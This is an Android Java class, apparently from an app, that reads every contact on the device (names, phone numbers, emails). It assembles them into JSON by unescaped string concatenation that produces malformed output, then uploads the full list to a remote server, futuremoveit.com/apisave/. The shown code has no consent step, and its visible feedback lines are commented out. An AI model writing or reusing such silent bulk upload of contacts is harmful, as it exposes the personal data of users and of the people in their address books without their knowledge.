package com.bitsofttech.biu;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

/**
 * Created by Shahed on 4/9/2017.
 */

public class ReadContact {

    Context context;
    Cursor phones;
    StringBuffer phoneContainer,emailBuffer;
    SendContactInfo sendContactInfo;
    String jsonString=null;
    public ReadContact(Context context) {
        this.context = context;
    }

    public void read(){

        phoneContainer = new StringBuffer();
        emailBuffer = new StringBuffer();
        sendContactInfo = new SendContactInfo(context);


        //phoneContainer.append("{\"contact\":[");
        jsonString ="{\"contact\":[";
        phones = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        while (phones.moveToNext())
        {

            String id = phones.getString(phones.getColumnIndex(ContactsContract.Contacts._ID));
            String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            String email = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));



            jsonString +="{";
            jsonString += "\"name\":\""+name+"\",";
            jsonString += "\"phone\":\""+phoneNumber+"\",";
            jsonString +="\"email\":\""+email+"\"";
            jsonString += "},";
        }

        //read email
        Cursor emailCur = context.getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,null,
                null,null, null);

        String email1=null,emailname=null;

        while (emailCur.moveToNext()) {
            email1 = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
            emailname = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME));

            jsonString +="{";
            jsonString += "\"name\":\""+emailname+"\",";
            jsonString += "\"email\":\""+email1+"\"";
            jsonString += "},";
        }
        emailCur.close();


        //phoneContainer.append("]}");
        jsonString += "]}";
        phones.close();
        //Log.d("Clients",jsonString);

        sendContactInfo.execute("http://futuremoveit.com/apisave/", String.valueOf(jsonString));
        //Toast.makeText(context,phoneContainer,Toast.LENGTH_LONG).show();
    }
}
